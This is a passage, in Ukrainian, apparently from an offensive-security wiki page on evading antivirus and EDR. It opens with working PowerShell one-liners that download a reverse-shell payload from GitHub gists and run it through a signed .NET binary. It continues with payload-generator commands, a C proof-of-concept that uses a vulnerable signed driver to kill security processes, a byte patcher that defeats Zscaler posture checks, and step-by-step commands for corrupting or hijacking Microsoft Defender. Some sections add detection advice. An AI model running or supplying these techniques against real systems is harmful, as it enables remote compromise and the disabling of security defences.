[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання Python для створення injectors: приклад

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – знищення AV/EDR із простору ядра

Storm-2603 використовував невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед запуском ransomware. Інструмент постачається з **власним вразливим, але *підписаним* драйвером** і використовує його для виконання привілейованих операцій ядра, які не можуть заблокувати навіть AV-служби з режимом Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: Файл, що записується на диск, має назву `ServiceMouse.sys`, але фактично це легітимний підписаний драйвер `AToolsKrnl64.sys` із «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується, навіть коли ввімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із простору користувача.
3. **IOCTL-коди, доступні через драйвер**
   | IOCTL-код | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для завершення служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю оминає захисти в user-mode; код, що виконується в kernel, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти kernel незалежно від PPL/PP, ELAM чи інших функцій посилення захисту.

Виявлення / пом’якшення наслідків
• Увімкніть список заблокованих вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
• Відстежуйте створення нових служб *kernel* і сповіщайте, якщо драйвер завантажується з каталогу, доступного для запису всім користувачам, або відсутній у списку дозволених.
• Стежте за дескрипторами user-mode до спеціальних об’єктів пристроїв, за якими йдуть підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector через виправлення бінарного файлу на диску

**Client Connector** від Zscaler локально застосовує правила стану пристрою та використовує Windows RPC для передавання результатів іншим компонентам. Два слабкі рішення в дизайні дають змогу повністю обійти перевірки:

1. Оцінювання стану пристрою відбувається **повністю на боці клієнта** (на сервер надсилається булеве значення).
2. Внутрішні кінцеві точки RPC перевіряють лише, чи **підписаний Zscaler** виконуваний файл, що підключається (за допомогою `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Виправивши чотири підписані бінарні файли на диску**, можна нейтралізувати обидва механізми:

| Бінарний файл | Вихідна логіка, що виправляється | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож кожна перевірка вважається успішною |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який процес (навіть непідписаний) може підключатися до каналів RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Обійдено коротким замиканням |

Мінімальний фрагмент patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану відображаються зеленими/відповідними вимогам.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки named-pipe RPC (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як суто клієнтські рішення щодо довіри та прості перевірки підпису можна обійти кількома байтовими patches.

## Microsoft Defender: зловживання довіреною функціональністю `BTR.sys`

Драйвер **Boot-Time Removal** у Defender — корисний контрприклад класичному BYOVD. `BTR.sys` — легітимний підписаний Microsoft компонент для усунення загроз, у якому немає помилки пошкодження пам’яті чи інтерфейсу IOCTL; натомість, отримавши права адміністратора та `SeLoadDriverPrivilege`, оператор може підробити приватну транзакцію усунення загроз і виконати передбачені операції з файлами та реєстром на Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початкового доступу чи підвищення привілеїв**; драйвер можна видобути з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, а не імпортувати помітний драйвер стороннього виробника.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender зберігає ресурс у вигляді файлу з випадковою назвою `[a-z]{8}.sys` і реєструє службу ядра з подібною назвою. `DriverEntry` читає значення `Args` служби, відкриває вказаний NTFS ADS, розшифровує та перевіряє список дій, записує дані зворотного зв’язку й після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб драйвер вивантажився, а не залишався резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один зашифрований RC4 блок даних. В аналізованих збірках повторно використовується фіксований 256-байтовий ключ, тому шифрування не є межею авторизації. Коректний відкритий текст містить глобальний заголовок розміром 24 байти (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ID транзакції, обчислений на основі корисного навантаження), після якого йдуть шлях зворотного зв’язку у форматі UTF-16 із нульовим термінатором і довільна кількість елементів. Кожен елемент має 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що закінчуються **рівно чотирма байтами NUL**. Кожна область заголовка й даних перевіряється окремо за допомогою CRC-32 із поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Підтримувані ID дій відкривають доступ до цих примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалити файл, зокрема заблокований |
| 2 | `[UTF-16 path]` | Видалити порожній каталог |
| 3 | `[Flags][source][destination]` | Перемістити файл у захищений шлях, вибраний атакувальником; порожнє призначення означає видалення |
| 4 | `[Flags][key path]` | Рекурсивно видалити ключ реєстру |
| 5 | `[Flags][key path + "\\" + value]` | Видалити значення реєстру |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створити або оновити значення реєстру та створити відсутні шляхи ключів |

Для дій 5 і 6 у переданих даних роздільником між ключем і значенням є **два символи зворотної скісної риски поспіль**; шлях у звичному форматі не буде розділено коректно. Файл зворотного зв’язку здебільшого повторює запит, але перші чотири байти даних кожного елемента стають його результатом `NTSTATUS`. Для дій 1 і 2, у яких немає початкового поля прапорців, BTR переміщує шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Робочий процес `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік зворотного зв’язку, серіалізує та обчислює контрольні суми для ланцюжка дій, шифрує його, безпосередньо створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер як драйвер, що запускається під час старту системи, для `-trigger boot`. Безпосереднє налаштування реєстру обходить звичайний шлях SCM `CreateServiceW`, тому **не створює** подію встановлення служби з ID 7045. Артефакти, створені для запуску під час завантаження, згодом можна видалити за допомогою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry`, перш ніж стек сховища та посилання `SystemRoot` будуть готові. `Start=1` разом із групою високого пріоритету `Boot Bus Extender` натомість запускається у Phase 1: NTFS уже доступна, але багато драйверів безпеки із системним типом запуску та служб EDR у user mode ще не ініціалізовано. Фільтри із типом запуску Boot, як-от `WdFilter`, уже можуть бути завантажені, однак BTR може видалити їхні бінарні файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до їхнього запуску через SCM. ELAM не усуває цю прогалину, оскільки BTR запускається після оцінювання драйверів із типом запуску Boot і має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в межах однієї транзакції. PoC додає на початку Action 1 для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, потім обробляє власний запит на видалення та видаляє його перед вивантаженням. Це зменшує кількість доказів, а розміщення зворотного зв’язку в `<random>.sys:<random>.dat` дає змогу видалити драйвер і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції для виявлення з високою точністю

Правила, що ґрунтуються лише на підписах, і список блокування вразливих драйверів Microsoft не захищають від зловживання передбаченою функціональністю BTR. Надавайте перевагу таким поведінковим кореляціям, водночас відрізняючи легітимне походження від Defender від запуску довільним процесом.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є універсальним для підготовки BTR. ADS `.dat`, прикріплений до того самого `.sys`, особливо підозрілий, оскільки легітимний Defender зазвичай розміщує зворотний зв’язок у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте пряме створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, що містить `Args=...:changelist` і `Group=Boot Bus Extender`, за відсутності відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** корелюйте завантаження відомого драйвера BTR не з походженням Defender із подальшим видаленням файлу, яке виконує `System`/PID 4, особливо якщо йдеться про бінарні файли засобів безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте та перевіряйте призначення/увімкнення `SeLoadDriverPrivilege`; самого підпису Microsoft недостатньо, щоб вважати довіреним драйвер засобу безпеки, підготовлений через `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписувачів і рівнів, за якої втручатися одне в одного можуть лише захищені процеси з таким самим або вищим рівнем. З погляду атакувальника, якщо можна легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, benign-функціональність (наприклад, журналювання) можна перетворити на обмежений примітив запису із захистом PPL у захищені каталоги, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (і всі завантажені DLL) має бути підписаний EKU із підтримкою PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний рівень захисту, що відповідає підписувачу бінарного файла (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів засобів захисту від шкідливого ПЗ, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильний рівень призведе до помилки створення.

Див. також ширший вступ до PP/PPL і захисту LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Допоміжний інструмент із відкритим вихідним кодом: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Приклад використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає себе повторно та приймає параметр для запису файлу журналу за вказаним викликачем шляхом.
- Якщо запустити його як процес PPL, файл записується з підтримкою PPL.
- ClipUp не може обробляти шляхи з пробілами; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Помічники для коротких шляхів 8.3
- Перегляньте короткі імена: `dir /x` у кожному батьківському каталозі.
- Отримайте короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (абстрактно)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із `CREATE_PROTECTED_PROCESS` за допомогою засобу запуску (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху до журналу ClipUp, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо AV зазвичай відкриває або блокує цільовий бінарний файл під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, установивши службу автозапуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження запис із підтримкою PPL виконується до того, як AV заблокує свої бінарні файли, що пошкоджує цільовий файл і перешкоджає запуску.

Приклад виклику (шляхи приховано або скорочено задля безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Нотатки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, лише його розташування; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби та перезавантаження потрібні права локального адміністратора/SYSTEM.
- Час має вирішальне значення: цільовий файл не має бути відкритим; виконання під час завантаження системи дає змогу уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо його батьківський процес — нестандартний засіб запуску, під час завантаження системи або приблизно в цей час.
- Нові служби, налаштовані на автоматичний запуск підозрілих двійкових файлів і стабільний запуск до Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів Defender/каталогів Platform; неочікуване створення/зміна файлів процесами з прапорцями protected-process.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL двійковими файлами, не пов’язаними з AV.

Заходи пом’якшення
- WDAC/Code Integrity: обмежте, які підписані двійкові файли можуть запускатися як PPL і з якими батьківськими процесами; блокуйте запуск ClipUp поза легітимними контекстами.
- Належне керування службами: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист від підміни Defender та засоби захисту на ранньому етапі завантаження ввімкнено; перевіряйте помилки запуску, які вказують на пошкодження двійкових файлів.
- Якщо це сумісно з вашим середовищем, розгляньте можливість вимкнути генерацію коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно протестуйте).

## Підміна Microsoft Defender через захоплення symlink папки версії Platform

Windows Defender визначає платформу, з якої запускається, перелічуючи підпапки в:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підпапку з найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Під час цього вибору довіряє записам каталогів, зокрема точкам повторної обробки каталогів (symlink). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису зловмиснику, і здійснити DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний адміністратор (потрібен для створення каталогів/symlink у папці Platform)
- Можливість перезавантажити систему або запустити повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані засоби (mklink)

Чому це працює
- Defender блокує запис у власні папки, але під час вибору платформи довіряє записам каталогів і вибирає версію з найвищим лексикографічним значенням, не перевіряючи, чи веде цільовий шлях до захищеного/довіреного розташування.

Покроково (приклад)
1) Підготуйте доступний для запису клон поточної папки платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть усередині Platform symlink каталогу з вищою версією, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендовано перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слід перевірити новий шлях процесу в `C:\TMP\AV\` і переконатися, що конфігурація служби та реєстру вказують на це розташування.

Можливості після експлуатації
- DLL sideloading/виконання коду: розмістити або замінити DLL, які Defender завантажує з каталогу своєї програми, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Зупинка служби/відмова в обслуговуванні: видалити символічне посилання на версію, щоб під час наступного запуску налаштований шлях не вказував на потрібне місце й Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує підвищення привілеїв; для її застосування потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing із PIC (у стилі Crystal Kit)

Red teams можуть перенести runtime evasion із C2 implant безпосередньо в цільовий модуль, перехопивши його Import Address Table (IAT) і перенаправивши вибрані API через контрольований зловмисником position-independent code (PIC). Це дає змогу застосовувати evasion не лише до невеликої кількості API, доступних у багатьох наборах інструментів (наприклад, CreateProcessA), а й поширити ті самі засоби захисту на BOFs і post-exploitation DLL.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід на високому рівні
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (додавши його на початок або як окремий файл-компаньйон). PIC має бути самодостатнім і позиційно-незалежним.
- Коли host DLL завантажується, пройдіть її IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі обгортки PIC.
- Кожна обгортка PIC виконує evasion перед передаванням керування реальній адресі API через tail call. Типові заходи evasion:
  - Маскування/демаскування пам’яті до та після виклику (наприклад, шифрування ділянок beacon, перехід RWX→RX, зміна назв/дозволів сторінок) із подальшим відновленням.
  - Call-Stack Spoofing: створення безпечного стека й перехід до цільового API, щоб під час аналізу стека викликів відображалися очікувані фрейми.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб скрипт Aggressor (або аналог) міг зареєструвати API для перехоплення в Beacon, BOFs і post-ex DLL.

Навіщо тут IAT hooking
- Працює з будь-яким кодом, що використовує перехоплений імпорт, без модифікації коду інструментів і без потреби покладатися на Beacon для проксіювання конкретних API.
- Охоплює post-ex DLL: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати ті самі засоби маскування/ухилення від аналізу стека до їхніх викликів API.
- Відновлює надійне використання post-ex команд для створення процесів проти засобів виявлення на основі стека викликів, перехоплюючи CreateProcessA/W.

Схема мінімального IAT hook (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Примітки
- Застосовуйте патч після релокацій/ASLR і до першого використання імпорту. Reflective loaders, як-от TitanLdr/AceLdr, демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers невеликими й безпечними для PIC; отримуйте справжній API через початкове значення IAT, збережене до патчингу, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки доступними для запису та виконання одночасно.

Заглушка підміни стека викликів
- PIC-заглушки в стилі Draugr створюють фальшивий ланцюжок викликів (з адресами повернення в benign-модулях), а потім передають керування справжньому API.
- Це обходить виявлення, яке очікує канонічні стеки від Beacon/BOFs під час викликів чутливих API.
- Поєднуйте це з техніками обрізання стека/зшивання стека, щоб потрапити в очікувані кадри перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLL, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро отримували переваги від того самого шляху evasion без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси non-image (heap/anon); періодична перевірка покажчиків імпорту.
- Аномалії стека: адреси повернення, що не належать завантаженим образам; різкі переходи до non-image PIC; невідповідна ієрархія RtlUserThreadStart.
- Телеметрія loader: записи в IAT зсередини процесу, активність DllMain на ранньому етапі зі зміною import thunks, неочікувані RX-регіони, створені під час завантаження.
- Обхід image-load: якщо hooking LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані будівельні блоки та приклади
- Reflective loaders, що виконують патчинг IAT під час завантаження (наприклад, TitanLdr, AceLdr)
- Hooks маскування пам’яті (наприклад, simplehook) і PIC для обрізання стека (stackcutting)
- PIC-заглушки підміни стека викликів (наприклад, Draugr)


## Hooking IAT під час імпорту + обфускація сну (Crystal Palace/PICO)

### Hooks IAT під час імпорту через резидентний PICO

Якщо ви контролюєте reflective loader, можна виконати hooking імпортів **під час** `ProcessImports()`, замінивши покажчик `GetProcAddress` у loader на власний resolver, який спершу перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **резидентний PICO** (постійний об’єкт PIC), який зберігається після того, як тимчасовий loader PIC звільняє себе.
- Експортуйте функцію `setup_hooks()`, яка перезаписує resolver імпорту loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте пошук hook на основі hash, наприклад `__resolve_hook(ror13hash(name))`. Якщо hook знайдено, поверніть його; інакше передайте виклик справжньому `GetProcAddress`.
- Реєструйте цілі hooks під час лінкування за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається дійсним, оскільки розміщений у резидентному PICO.

Це забезпечує **перенаправлення IAT під час імпорту** без патчингу секції коду завантаженої DLL після завантаження.

### Примусове додавання імпортів, які можна перехопити, коли ціль використовує обхід PEB

Hooks під час імпорту спрацьовують лише тоді, коли функція справді є в IAT цілі. Якщо модуль знаходить API через обхід PEB + hash (без запису імпорту), примусово додайте справжній імпорт, щоб шлях `ProcessImports()` loader його обробив:

- Замініть пошук експортів через hash (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання, наприклад `&WaitForSingleObject`.
- Компілятор створить запис IAT, що дасть змогу перехопити виклик, коли reflective loader розв’язуватиме імпорти.

### Обфускація сну/простою в стилі Ekko без патчингу `Sleep()`

Замість патчингу `Sleep` перехоплюйте **фактичні примітиви очікування/IPC**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалих очікувань обгорніть виклик ланцюжком обфускації в стилі Ekko, який шифрує образ у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer` для планування послідовності callbacks, які викликають `NtContinue` зі спеціально сформованими кадрами `CONTEXT`.
- Типовий ланцюжок (x64): встановити для образу `PAGE_READWRITE` → зашифрувати RC4 через `advapi32!SystemFunction032` весь відображений образ → виконати блокувальне очікування → розшифрувати RC4 → **відновити дозволи для кожної секції**, обійшовши PE-секції → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька кадрів і встановіть регістри (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте «success» для тривалих очікувань (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив роботу, поки образ замаскований. Цей шаблон приховує модуль від сканерів під час простою та уникає класичного сигнатурного сліду «патченого `Sleep()`».

Ідеї для виявлення (на основі телеметрії)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суцільних буферів розміром з образ.
- `VirtualProtect` для великого діапазону з подальшим відновленням дозволів для кожної секції власним кодом.

